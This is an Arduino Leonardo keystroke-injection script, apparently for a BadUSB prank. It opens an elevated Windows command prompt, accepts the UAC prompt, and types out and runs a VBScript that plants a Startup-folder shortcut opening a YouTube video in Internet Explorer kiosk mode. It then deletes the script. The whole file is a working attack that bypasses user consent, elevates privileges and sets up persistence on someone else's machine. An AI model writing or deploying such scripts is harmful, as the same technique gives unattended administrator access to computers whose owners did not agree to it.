#include <phukdlib_leonardo.h>
#define kbd_es_es

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.print("cmd");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(4000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("copy con YouveBeenUglyRolled.vbs");
  delay(2000);
  Keyboard.println("Set WshShell = WScript.CreateObject(\"WScript.Shell\"):");
  delay(2000);
  Keyboard.println("StrMyStartUp = WshShell.SpecialFolders(\"Startup\"):");
  delay(2000);
  Keyboard.println("Set lnk = WshShell.CreateShortcut(StrMyStartUp + \"\\YouveBeenUglyRolled.lnk\"):");
  delay(2000);
  Keyboard.println("lnk.TargetPath = \"%programfiles(x86)%\\Internet Explorer\\iexplore.exe\":");
  delay(2000);
  Keyboard.println("lnk.Arguments = \"-K http://www.youtube.com/v/XYYo3T6nCw8?autoplay=1\":");
  delay(2000);
  Keyboard.println("lnk.Save");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("YouveBeenUglyRolled.vbs");
  delay(2000);
  Keyboard.println("del YouveBeenUglyRolled.vbs");
  delay(2000);
  Keyboard.println("exit");
  while(1);
}
